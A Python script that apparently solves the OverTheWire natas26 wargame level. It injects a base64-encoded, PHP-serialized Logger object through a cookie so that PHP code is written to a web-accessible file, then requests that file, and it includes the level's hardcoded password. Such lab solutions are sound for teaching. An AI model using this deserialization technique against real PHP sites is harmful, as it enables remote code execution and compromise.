import requests
from requests.auth import HTTPBasicAuth

# Just for a nicer output
from phpserialize import loads

uri = 'http://natas26.natas.labs.overthewire.org/'

# payload = {'x1' : '10', 'y1' : '10', 'x2' : '140', 'y2' : '140'}
p = requests.get(uri,
    auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
    cookies={'drawing' : 'Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czoyMzoiPD9waHAgcGhwdmVyc2lvbigpOyA/PgoiO3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozODoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvdW1waGFjay5waHAiO30='})
print( p.text )
g = requests.get(uri + 'img/umphack.php',
    auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'))
print( g.text )
# payload = {'x1' : '150', 'y1' : '150', 'x2' : '10', 'y2' : '10'}
# p = requests.get(uri,
#     auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
#     cookies={'PHPSESSID' : 'umphack',
#              'drawing': p.cookies['drawing']},
#     params = payload)
# payload = {'x1' : '5', 'y1' : '10', 'x2' : '10', 'y2' : '20'}
# p = requests.get(uri,
#     auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
#     cookies={'PHPSESSID' : 'umphack',
#              'drawing': p.cookies['drawing']},
#     params = payload)
# print( loads(p.cookies['drawing'].decode('base64')) )
